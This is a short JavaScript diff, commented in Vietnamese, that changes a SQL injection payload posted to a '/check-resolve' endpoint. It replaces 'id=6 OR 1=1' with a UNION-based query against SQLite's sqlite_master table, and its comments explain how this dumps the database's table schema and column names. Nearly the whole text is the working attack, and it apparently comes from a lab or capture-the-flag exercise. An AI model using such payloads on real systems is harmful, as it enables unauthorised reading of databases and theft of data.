@@ -1,6 +1,8 @@
-// Thay vì truyền id = 6, ta truyền payload SQL Injection
 let formData = new URLSearchParams();
-formData.append('id', '6 OR 1=1'); 
+
+// Dùng -1 để dòng đầu tiên bị rỗng, nhường chỗ cho kết quả UNION của chúng ta in ra
+// sql là cột chứa câu lệnh CREATE TABLE trong SQLite, nó sẽ lộ hết tên cột!
+formData.append('id', '-1 UNION SELECT sql FROM sqlite_master');
 
 fetch('/check-resolve', {
     method: 'POST',
